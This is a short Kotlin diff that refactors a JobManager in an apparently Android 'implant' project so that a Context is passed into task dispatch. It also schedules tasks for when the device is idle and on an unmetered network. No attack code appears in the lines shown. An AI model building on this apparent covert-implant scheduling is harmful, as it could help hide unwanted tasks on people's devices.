@@ -1,5 +1,6 @@
 package com.cooperthecoder.implant.command
 
+import android.content.Context
 import android.content.Intent
 import android.util.Log
 import com.cooperthecoder.implant.App
@@ -10,9 +11,9 @@ object JobManager {
 
     val TAG = JobManager::class.java.name
 
-    fun schedule(tag: String, every: Long): Unit {
+    fun schedule(context: Context, tag: String, every: Long): Unit {
         if (Config.DEBUG) {
-            runTaskImmediately(tag)
+            runTaskImmediately(context, tag)
         }
 
         // Do this plugged in on an unmetered network when the device is idle.
@@ -27,9 +28,8 @@ object JobManager {
 
     }
 
-    private fun runTaskImmediately(tag: String) {
+    private fun runTaskImmediately(context: Context, tag: String) {
         Log.d(TAG, "Dispatching task $tag immediately")
-        val context = App.instance
         val intent = Intent(context, DebugJobScheduler::class.java)
         intent.putExtra(DebugJobScheduler.EXTRA_TASK_NAME, tag)
         context.startService(intent)
